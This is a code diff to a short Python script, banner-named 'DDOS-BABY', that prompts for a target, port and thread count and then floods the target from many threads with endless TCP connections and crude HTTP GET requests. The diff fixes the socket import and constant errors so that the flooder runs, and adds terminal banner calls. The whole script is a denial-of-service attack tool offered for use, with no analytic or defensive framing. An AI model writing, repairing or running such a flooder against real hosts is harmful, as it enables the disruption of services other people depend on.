@@ -2,9 +2,12 @@
 
 #importing libraries
 import requests
-import sockets
+import socket
 import threading ##threading to speed up the process
+import os
 
+os.system("clear") 
+os.system("toilet DDOS-BABY")
 
 
 target = str(input("Enter the target name or ip or domain name or url: "))
@@ -14,7 +17,7 @@ trd = int(input("Enter the number of threads: "))
 ##attacking mechanism will as follows
 def attack():
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK.STREAM) 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
         s.connect((target, port))
         s.send(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.close()
@@ -25,7 +28,9 @@ for i in range(trd):
     thread.start()
 
 
-    
+##os.system("clear") 
+##os.system("toilet DDOS-BABY")
+
 
 '''
 ##sending request to the server
